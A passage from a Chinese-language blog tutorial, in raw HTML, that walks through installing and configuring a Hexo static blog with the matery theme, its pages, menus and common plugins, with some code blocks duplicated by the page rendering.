language-bash"><code class="language-bash"><span class="token keyword">.</span>├── _config.yml   <span class="token comment" spellcheck="true"># 主要配置文件</span>├── package.json  <span class="token comment" spellcheck="true"># 应用程序的信息</span>├── scaffolds     <span class="token comment" spellcheck="true"># 模板文件夹,新建文章时,Hexo会根据 scaffold/post.md 来创建</span>├── <span class="token function">source</span>        <span class="token comment" spellcheck="true"># 资源文件夹是存放用户资源的地方</span><span class="token operator">|</span>   ├── _drafts<span class="token operator">|</span>   └── _posts└── themes        <span class="token comment" spellcheck="true"># 主题文件夹,根据主题生成静态页面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-config-yml"><a href="#3-config-yml" class="headerlink" title="3._config.yml"></a>3.<code>_config.yml</code></h3><blockquote><p>保存有网站的主要配置</p><p>关于这一部分,参考官网:<code>https://hexo.io/zh-cn/docs/configuration</code></p></blockquote><h3 id="4-主要命令说明"><a href="#4-主要命令说明" class="headerlink" title="4.主要命令说明"></a>4.主要命令说明</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 初始化网站</span>$ <span class="token function">cd</span> myblog$ hexo init <span class="token comment" spellcheck="true"># 新建一篇文章</span>$ hexo new <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">></span>$ hexo new post <span class="token string">"article_name"</span>  <span class="token comment" spellcheck="true"># 新建文章</span>$ hexo new page <span class="token string">"name"</span>          <span class="token comment" spellcheck="true"># 少用</span><span class="token comment" spellcheck="true"># 生成静态文件,可简写为 hexo g</span>$ hexo generate  $ hexo g <span class="token comment" spellcheck="true"># 生成草稿</span>$ hexo putlish <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>filename<span class="token operator">></span><span class="token comment" spellcheck="true"># 启动服务器 可以简写为 hexo s</span>$ hexo server<span class="token comment" spellcheck="true"># 参数: -p:指定端口</span><span class="token comment" spellcheck="true">#      -s:只使用静态文件</span><span class="token comment" spellcheck="true">#      -i:指定ip地址</span><span class="token comment" spellcheck="true"># 部署网站,可以简写为 hexo d</span>$ hexo deploy <span class="token comment" spellcheck="true"># 清除缓存文件 db.json 和已经成成的静态文件 public</span>$ hexo clean<span class="token comment" spellcheck="true"># 查看版本</span>$ hexo version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="运行一个简单的Hexo"><a href="#运行一个简单的Hexo" class="headerlink" title="运行一个简单的Hexo"></a>运行一个简单的<code>Hexo</code></h2><h3 id="5-运行网站"><a href="#5-运行网站" class="headerlink" title="5.运行网站"></a>5.运行网站</h3><blockquote><p>直接运行网站:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 如果有权限的问题,使用 sudo 运行</span>$ hexo g$ hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到初始的<code>hexo</code>网站,但是这个页面并不好看,也不实用,这就需要安装一些其他的主题.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10136.png" alt="10136"></p></blockquote><h2 id="Hexo切换主题"><a href="#Hexo切换主题" class="headerlink" title="Hexo切换主题"></a><code>Hexo</code>切换主题</h2><h3 id="6-安装主题"><a href="#6-安装主题" class="headerlink" title="6.安装主题"></a>6.安装主题</h3><blockquote><p><code>hexo</code>的主题有很多,比如</p><ul><li><code>hexo-theme-yilia</code></li><li><code>hexo-theme-bmw</code></li><li><code>hexo-theme-stun</code></li><li><code>hexo-theme-matery</code></li><li>…</li></ul><p>等等,这里使用的是<code>hexo-theme-matery</code> ,可以根据自己的喜好去选择主题.</p><p>项目地址:<code>https://github.com/blinkfox/hexo-theme-matery/tree/master</code></p></blockquote><h4 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h4><blockquote><p>进入<code>Blog</code>的<code>theme</code> 目录,然后下载:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cd</span> myblog/theme/$ <span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="2-切换主题"><a href="#2-切换主题" class="headerlink" title="2.切换主题"></a>2.切换主题</h4><blockquote><p>修改<code>Hexo</code> 根目录下的 <code>_config.yml</code> 的 <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><p><code>_config.yml</code> 文件的其它修改建议:</p><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul></blockquote><h4 id="3-新建分类-categories-页"><a href="#3-新建分类-categories-页" class="headerlink" title="3.新建分类 categories 页"></a>3.新建分类 categories 页</h4><blockquote><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre><code>hexo new page &quot;categories&quot;</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre><code>---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---</code></pre></blockquote><h4 id="4-新建标签-tags-页"><a href="#4-新建标签-tags-页" class="headerlink" title="4.新建标签 tags 页"></a>4.新建标签 tags 页</h4><blockquote><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre><code>hexo new page &quot;tags&quot;</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre><code>---title: tagsdate: 2018-09-30 18:23:38type: &quot;tags&quot;layout: &quot;tags&quot;---</code></pre></blockquote><h4 id="5-新建关于我-about-页"><a href="#5-新建关于我-about-页" class="headerlink" title="5.新建关于我 about 页"></a>5.新建关于我 about 页</h4><blockquote><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre><code>hexo new page &quot;about&quot;</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre><code>---title: aboutdate: 2018-09-30 17:25:30type: &quot;about&quot;layout: &quot;about&quot;---</code></pre></blockquote><h4 id="6-新建留言板-contact-页"><a href="#6-新建留言板-contact-页" class="headerlink" title="6.新建留言板 contact 页"></a>6.新建留言板 contact 页</h4><blockquote><p><code>contact</code> 页是用来展示<strong>留言板</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>contact/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre><code>hexo new page &quot;contact&quot;</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/contact/index.md</code>，至少需要以下内容：</p><pre><code>---title: contactdate: 2018-09-30 17:25:30type: &quot;contact&quot;layout: &quot;contact&quot;---</code></pre><blockquote><p><strong>注</strong>：本留言板功能依赖于第三方评论系统，请<strong>激活</strong>你的评论系统才有效果。并且在主题的 <code>_config.yml</code> 文件中，第 <code>19</code> 至 <code>21</code> 行的“<strong>菜单</strong>”配置，取消关于留言板的注释即可。</p><p>这里先放置一下</p></blockquote></blockquote><h4 id="7-新建友情链接-friends-页"><a href="#7-新建友情链接-friends-页" class="headerlink" title="7.新建友情链接 friends 页"></a>7.新建友情链接 friends 页</h4><blockquote><p><code>friends</code> 页是用来展示<strong>友情链接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre><code>hexo new page &quot;friends&quot;</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre><code>---title: friendsdate: 2018-12-12 21:25:30type: &quot;friends&quot;layout: &quot;friends&quot;---</code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre><code>[{ &quot;avatar&quot;: &quot;http://image.luokangyuan.com/1_qq_27922023.jpg&quot;, &quot;name&quot;: &quot;码酱&quot;, &quot;introduction&quot;: &quot;我不是大佬，只是在追寻大佬的脚步&quot;, &quot;url&quot;: &quot;http://luokangyuan.com/&quot;, &quot;title&quot;: &quot;前去学习&quot;}]</code></pre></blockquote><h4 id="8-导航菜单"><a href="#8-导航菜单" class="headerlink" title="8.导航菜单"></a>8.导航菜单</h4><blockquote><p>1.菜单导航名称可以是中文也可以是英文(如：<code>Index</code>或<code>主页</code>) 2.图标icon 可以在<a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中查找</p><pre><code>menu:Index: url: / icon: fas fa-homeTags: url: /tags icon: fas fa-tagsCategories: url: /categories icon: fas fa-bookmarkArchives: url: /archives icon: fas fa-archiveAbout: url: /about icon: fas fa-user-circleFriends: url: /friends icon: fas fa-address-book</code></pre><p><strong>二级菜单配置方法</strong></p><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作<br>1.在需要添加二级菜单的一级菜单下添加<code>children</code>关键字(如:<code>About</code>菜单下添加<code>children</code>)<br>2.在<code>children</code>下创建二级菜单的 名称name,路径url和图标icon.<br>3.注意每个二级菜单模块前要加 <code>-</code>.<br>4.注意缩进格式</p><pre><code>menu:Index: url: / icon: fas fa-homeTags: url: /tags icon: fas fa-tagsCategories: url: /categories icon: fas fa-bookmarkArchives: url: /archives icon: fas fa-archiveAbout: url: /about icon: fas fa-user-circle-oFriends: url: /friends icon: fas fa-address-bookMedias: icon: fas fa-list children:      - name: Musics        url: /musics        icon: fas fa-music      - name: Movies        url: /movies        icon: fas fa-film      - name: Books        url: /books        icon: fas fa-book      - name: Galleries        url: /galleries        icon: fas fa-image</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件</p></blockquote><h4 id="9-代码高亮"><a href="#9-代码高亮" class="headerlink" title="9.代码高亮"></a>9.代码高亮</h4><blockquote><p>由于<code>Hex 自带的代码高亮主题显示不好看，所以主题中使用到了 [hexo-prism-plugin](https://github.com/ele828/hexo-prism-plugin) 的</code>Hexo插件来做代码高亮，安装命令如下：</p><pre class="line-numbers language-bash">npm i -S hexo-prism-plugin</code></pre><p>然后，修改 <code>Hexo</code>根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre><code class="yaml"><code class="language-bash">npm i -S hexo-prism-plugin</code></pre><p>然后，修改 <code>Hexo</code>根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre><code class="yaml"># 44行 打开生成文件时同时生成文件夹post_asset_folder: truehighlight:enable: falseprism_plugin:mode: 'preprocess'    # realtime/preprocesstheme: 'tomorrow'line_number: false    # default falsecustom_css:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于,我们是最新的<code>hexo 5.0.0</code> 和这个插件还是有兼容性问题,这里把<code>hexo</code>进行了降级处理</p><p>查看 <code>Hexo</code>的当前版本：</p><pre><code>$ hexo version5.0.0</code></pre><p>打开 <code>Hexo</code> 根目录下的 <code>package.json</code> 文件，只用修改这一行的版本号：</p><pre class="line-numbers language-json"><code class="language-json">...<span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>-   <span class="token property">"hexo"</span><span class="token operator">:</span> <span class="token string">"^5.0.0"</span><span class="token punctuation">,</span>+   <span class="token property">"hexo"</span><span class="token operator">:</span> <span class="token string">"^4.2.1"</span><span class="token punctuation">,</span>...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改完毕后进行升级:</p><pre class="line-numbers language-bash">$ npm upgrade</code></pre><p>如果提示有依赖需要修复，则无脑修复：</p><pre><code class="bash">$ npm audit fix</code></pre><p>完成之后验证版本，确认升级成功：</p><pre><code class="bash">$ hexo version</code></pre><p>之后执行<code>hexo clean</code></p><p>新生成页面,并写入高亮文本,最后在页面上查看效果</p><pre><code class="bash"><code class="language-bash">$ npm upgrade</code></pre><p>如果提示有依赖需要修复，则无脑修复：</p><pre><code class="bash">$ npm audit fix</code></pre><p>完成之后验证版本，确认升级成功：</p><pre><code class="bash">$ hexo version</code></pre><p>之后执行<code>hexo clean</code></p><p>新生成页面,并写入高亮文本,最后在页面上查看效果</p><pre><code class="bash"># 创建一个文件,查看效果$ hexo new post "test"$ vim test.md# $ hexo clean$ hexo g$ hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/11000.png"></p></blockquote><h4 id="10-搜索"><a href="#10-搜索" class="headerlink" title="10.搜索"></a>10.搜索</h4><blockquote><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre><code>npm install hexo-generator-search --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre><code>search: path: search.xml field: post</code></pre></blockquote><h4 id="11-中文链接转拼音"><a href="#11-中文链接转拼音" class="headerlink" title="11.中文链接转拼音"></a>11.中文链接转拼音</h4><blockquote><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre><code>npm i hexo-permalink-pinyin --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre><code>permalink_pinyin: enable: true separator: &#39;-&#39; # default: &#39;-&#39;</code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote></blockquote><h4 id="12-文章字数统计"><a href="#12-文章字数统计" class="headerlink" title="12.文章字数统计"></a>12.文章字数统计</h4><blockquote><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre><code>npm i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">postInfo</span><span class="token punctuation">:</span> <span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token key atrule">update</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token key atrule">wordCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 设置文章字数统计为 true.</span> <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 设置站点文章总字数统计为 true.</span> <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 阅读时长.</span> <span class="token key atrule">readCount</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 阅读次数.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="13-添加emoji表情支持"><a href="#13-添加emoji表情支持" class="headerlink" title="13.添加emoji表情支持"></a>13.添加emoji表情支持</h4><blockquote><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis" target="_blank" rel="noopener">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre><code>npm install hexo-filter-github-emojis --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span> <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token key atrule">styles</span><span class="token punctuation">:</span> customEmojis<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="14-添加RSS"><a href="#14-添加RSS" class="headerlink" title="14.添加RSS"></a>14.添加<code>RSS</code></h4><blockquote><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre><code>npm install hexo-generator-feed --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> atom <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span> <span class="token key atrule">hub</span><span class="token punctuation">:</span> <span class="token key atrule">content</span><span class="token punctuation">:</span> <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span> <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span> <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p></blockquote><h4 id="15-修改社交"><a href="#15-修改社交" class="headerlink" title="15.修改社交"></a>15.修改社交</h4><blockquote><p>修改主题文件中的<code>_config</code>文件,修改<code>socialLink</code>选项中的内容,修改为自己的内容.</p></blockquote><h4 id="16-修改打赏的二维码图片"><a href="#16-修改打赏的二维码图片" class="headerlink" title="16.修改打赏的二维码图片"></a>16.修改打赏的二维码图片</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 修改这两张图片修改为自己的</span>❯ <span class="token function">ls</span> themes/hexo-theme-matery/source/medias/rewardalipay.jpg  wechat.png❯ <span class="token function">sudo</span> hexo g❯ <span class="token function">sudo</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="17-添加动漫人物"><a href="#17-添加动漫人物" class="headerlink" title="17.添加动漫人物"></a>17.添加动漫人物</h4><blockquote><ol><li>安装<code>hexo-helper-live2d</code></li></ol><pre class="line-numbers language-bash">npm install --save hexo-helper-live2d</code></pre><ol start="2"><li>安装其他插件</li></ol><pre><code class="bash">npm install live2d-widget-model-shizuku</code></pre><ol start="3"><li>修改项目根目录下<code>_config</code>的配置</li></ol><pre><code class="yaml"><code class="language-bash">npm install --save hexo-helper-live2d</code></pre><ol start="2"><li>安装其他插件</li></ol><pre><code class="bash">npm install live2d-widget-model-shizuku</code></pre><ol start="3"><li>修改项目根目录下<code>_config</code>的配置</li></ol><pre><code class="yaml">live2d:  enable: true  scriptFrom: local  pluginRootPath: live2dw/  pluginJsPath: lib/  pluginModelPath: assets/  tagMode: false  log: false  model:    use: live2d-widget-model-shizuku  display:    position: right    width: 150    height: 300  mobile:    show: true  react:    opacity: 0.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>从新生成</li></ol><pre class="line-numbers language-bash"><code class="language-bash">hexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="18-文章头部改写"><a href="#18-文章头部改写" class="headerlink" title="18.文章头部改写"></a>18.文章头部改写</h4><blockquote><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><p>最简示例</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最全示例</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> 赵奇<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改<code>scaffolds/post.md</code>中的配置,新生成的文件会以这个文件为模板生成.</p><p>如果设置了加密,这主题文件下的<code>_config</code>文件也需要开启加密(<code>verifyPassword</code>选项)</p><p>新生成一个文件.</p><pre class="line-numbers language-bash"><code class="language-bash">hexo cleanhexo ghexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="19-更换logo"><a href="#19-更换logo" class="headerlink" title="19.更换logo"></a>19.更换<code>logo</code></h4><blockquote><p>制作一个<code>logo</code>,可以使用<code>canva.cn</code></p><p>更换主题下的<code>myblog/themes/hexo-theme-matery/source/favicon.png</code></p><p>更换主题下的<code>myblog/themes/hexo-theme-matery/source/medias/logo.png</code></p><p>上面两张可以是同一张图片.</p></blockquote><h4 id="20-留言板设置"><a href="#20-留言板设置" class="headerlink" title="20.留言板设置"></a>20.留言板设置</h4><blockquote><p>配置<code>Gitalk</code>评论模板</p><p>有关<code>OAuth2</code>第三方登录的<a href="https://wenyan.online/2020/09/05/oauth2-demo-md/" target="_blank" rel="noopener">理论说明</a>:<code>https://wenyan.online/2020/09/05/oauth2-demo-md/</code></p><ul><li><p>在主题中默认是不激活的.</p></li><li><p>获取<code>clientID\clientSecret</code></p><ul><li>访问<code>https://github.com/settings/applications/new</code>,填写相关内容</li><li><code>application</code>:应用名称,随意填写,<code>homepage url</code> :博客地址.<code>application description</code> :应用描述.<code>authorization caliback url</code> :填写博客地址.</li></ul></li><li><p>将得到的<code>clientID\clientSecret</code>填写到主题的配置文件中.</p></li></ul></blockquote><h4 id="21-替换关于页面"><a href="#21-替换关于页面" class="headerlink" title="21.替换关于页面"></a>21.替换关于页面</h4><blockquote><p>更换关于页面中的内容</p><p>修改主题目录中的<code>__config.yml</code>文件</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 205行左右</span><span class="token key atrule">profile</span><span class="token punctuation">:</span><span class="token key atrule">avatar</span><span class="token punctuation">:</span> /medias/avatar.jpg<span class="token key atrule">career</span><span class="token punctuation">:</span> Python<span class="token key atrule">introduction</span><span class="token punctuation">:</span> 这是一个自我介绍<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注:可以找一张图片置换<code>avatar.jpg</code></p></blockquote><h4 id="22-文章加载图片"><a href="#22-文章加载图片" class="headerlink" title="22.文章加载图片"></a>22.文章加载图片</h4><blockquote><ol><li>修改<code>_config.yml</code>,将<code>post_asset_folder:false</code> 修改为<code>true</code></li><li>安装一个图片路径转换插件.</li></ol><pre class="line-numbers language-bash">❯  npm install https://github.com/7ym0n/hexo-asset-image --save</code></pre><ol 